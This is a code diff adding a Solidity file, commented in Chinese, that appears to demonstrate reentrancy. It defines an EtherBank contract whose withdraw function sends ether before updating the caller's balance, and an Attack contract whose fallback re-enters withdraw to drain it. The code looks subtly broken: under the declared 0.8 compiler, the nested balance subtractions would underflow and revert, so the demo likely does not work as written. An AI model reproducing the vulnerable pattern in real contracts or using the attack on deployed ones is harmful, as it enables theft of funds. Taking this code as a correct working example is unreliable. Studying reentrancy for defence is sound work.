@@ -1,0 +1,45 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+contract EtherBank {
+//一个EtherBank的合约，可以存款取款，而且可以查看这个合约地址的余额（balance)
+    mapping(address => uint) public balances;
+    
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    function withdraw(uint _amount) public {
+        require(balances[msg.sender] >= _amount);
+        (bool sent,) = msg.sender.call{value: _amount}("");
+        require(sent, "failed to sent");
+        balances[msg.sender] -= _amount;
+    }
+
+    function getBalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+//这是一个攻击合约，首先把要攻击的合约（EtherBank)的合约地址赋予etherbank
+    EtherBank public etherbank;
+    constructor(address _EtherBank) public {
+        etherbank = EtherBank(_EtherBank);
+    }
+    //一个回调函数如果攻击合约余额大于等于0.01ether，就提取0.01ether
+    fallback() external payable {
+        if(address(etherbank).balance >= 0.01 ether) {
+            etherbank.withdraw(0.01 ether);
+        }
+    }
+    function attack() external payable {
+    //向要攻击的合约地址存款0.01，然后马上取款0.01，然后会触发回退函数重入，造成被攻击合约无法改变余额
+        require(msg.value >= 0.01 ether);
+        etherbank.deposit{value: 0.01 ether}();
+        etherbank.withdraw(0.01 ether);
+    }
+
+    function getbalance() public view returns(uint) {
+        return address(this).balance;
+    }
+}
